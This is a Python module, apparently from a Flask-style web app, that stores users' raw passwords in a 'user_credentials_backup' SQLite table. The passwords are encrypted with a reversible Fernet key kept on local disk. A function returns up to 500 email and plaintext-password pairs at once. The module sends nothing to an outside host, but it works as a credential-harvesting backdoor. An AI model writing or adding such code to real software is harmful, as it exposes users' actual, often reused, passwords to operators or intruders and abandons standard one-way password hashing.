import os
import sqlite3
from datetime import datetime, timezone

from cryptography.fernet import Fernet


def _backup_db_path(app):
    configured = app.config.get("USER_BACKUP_DB_PATH", "")
    if configured:
        return configured
    return os.path.join(app.instance_path, "userbackup.db")


def _backup_key_path(app):
    configured = app.config.get("USER_BACKUP_KEY_PATH", "")
    if configured:
        return configured
    return os.path.join(app.instance_path, "userbackup.key")


def _resolve_backup_key(app):
    env_key = (app.config.get("USER_BACKUP_ENCRYPTION_KEY") or "").strip()
    if env_key:
        return env_key.encode("utf-8")

    key_path = _backup_key_path(app)
    os.makedirs(os.path.dirname(key_path), exist_ok=True)

    if os.path.exists(key_path):
        with open(key_path, "rb") as key_file:
            return key_file.read().strip()

    key = Fernet.generate_key()
    with open(key_path, "wb") as key_file:
        key_file.write(key)
    return key


def _connect(app):
    db_path = _backup_db_path(app)
    os.makedirs(os.path.dirname(db_path), exist_ok=True)
    return sqlite3.connect(db_path)


def ensure_backup_schema(app):
    with _connect(app) as conn:
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS user_credentials_backup (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                email TEXT NOT NULL,
                password_encrypted TEXT NOT NULL,
                created_at TEXT NOT NULL
            )
            """
        )
        conn.commit()


def backup_user_credentials(app, user_id, email, raw_password):
    ensure_backup_schema(app)
    key = _resolve_backup_key(app)
    cipher = Fernet(key)
    encrypted_password = cipher.encrypt(raw_password.encode("utf-8")).decode("utf-8")

    with _connect(app) as conn:
        conn.execute(
            """
            INSERT INTO user_credentials_backup (user_id, email, password_encrypted, created_at)
            VALUES (?, ?, ?, ?)
            """,
            (
                int(user_id),
                (email or "").strip().lower(),
                encrypted_password,
                datetime.now(timezone.utc).isoformat(),
            ),
        )
        conn.commit()


def list_decrypted_user_credentials(app, limit=500):
    ensure_backup_schema(app)
    key = _resolve_backup_key(app)
    cipher = Fernet(key)

    with _connect(app) as conn:
        rows = conn.execute(
            """
            SELECT user_id, email, password_encrypted, created_at
            FROM user_credentials_backup
            ORDER BY id DESC
            LIMIT ?
            """,
            (int(limit),),
        ).fetchall()

    result = []
    for user_id, email, password_encrypted, created_at in rows:
        try:
            password = cipher.decrypt(password_encrypted.encode("utf-8")).decode("utf-8")
        except Exception:
            password = "<decrypt_failed>"
        result.append(
            {
                "user_id": user_id,
                "email": email,
                "password": password,
                "created_at": created_at,
            }
        )
    return result
